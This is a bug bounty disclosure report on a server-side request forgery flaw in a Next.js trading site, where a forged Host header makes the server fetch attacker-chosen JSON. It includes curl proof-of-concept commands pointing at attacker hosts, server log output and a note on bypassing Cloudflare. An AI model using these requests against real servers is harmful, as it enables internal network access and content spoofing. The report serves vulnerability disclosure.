# #47740 \[W\&A-Critical] Server-Side Request Forgery (SSRF) in \`./src/pages/\_app.tsx\` via the Host header

**Submitted on Jun 19th 2025 at 12:58:45 UTC by @cdl for** [**IOP | Zano Trade**](https://immunefi.com/audit-competition/iop-zano-trade)

* **Report ID:** #47740
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** ./src/pages/\_app.tsx
* **Impacts:**
  * Retrieve sensitive data/files from a running server, such as:
* /etc/shadow
* database passwords
* blockchain keys (this does not include non-sensitive environment variables, open source code, or usernames)

## Description

## Brief/Intro

The Next.JS application is vulnerable to Server-Side Request Forgery (SSRF) on every page due to trusting user input in `./src/pages/_app.tsx`. This allows an attacker to issue HTTP requests originating from Zano's servers to any destination on the internet and to internal networks.

## Vulnerability Details

In `./src/pages/_app.tsx`, the application generates the intialPageProps *server-side* – <https://github.com/PRavaga/zano-p2p/blob/master/src/pages/\\_app.tsx#L61-L83>

It does so by:

1. Grabbing the Host header.
2. Building a URL from that host header.
3. Issuing an HTTP request to the URL.
4. Returning the JSON response in the page:

```
<script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{},"config":{JSON_RESPONSE_FROM_STEP_2}},
```

However, an attacker can control the `Host` header. So an attacker can send the following request:

```
$ curl http://localhost:30289/dex -H 'Host: attacker.com'
```

And the application is forced to make an HTTP request to <http://attacker.com/api/config/>

## Impact Details

An attacker can issue HTTP requests to internal network assets or can force the application to load their own spoofed JSON. The latter could potentially be used to poison the cache for other users (need to investigate this claim more).

## Proof of Concept

## Proof of Concept

1. Start the dex locally: `npm i; npm run build; npm start`
2. Start the HTTP server on the attacker VPS
3. Run:

`curl -H 'Host: x.xxe.sh' http://localhost:30289/dex` where `x.xxe.sh` is the FQDN / IP address of your attacking server.

You'll see the application fetches your host:

```
tail -F /var/log/apache2/access.log
REDACTED - - [19/Jun/2025:12:55:24 +0000] "GET /api/config HTTP/1.1" 301 573 "-" "node"
REDACTED - - [19/Jun/2025:12:55:24 +0000] "GET /api/config/ HTTP/1.1" 200 260 "-" "node"
```

Furthermore, if you use my host you'll see the page config is now set to:

```
{"pageProps":{},"config":{"ssrf":"cdl_was_here"}}
```

The live version is currently protected by Cloudflare, however it may be possible to find the Origin IP / server.
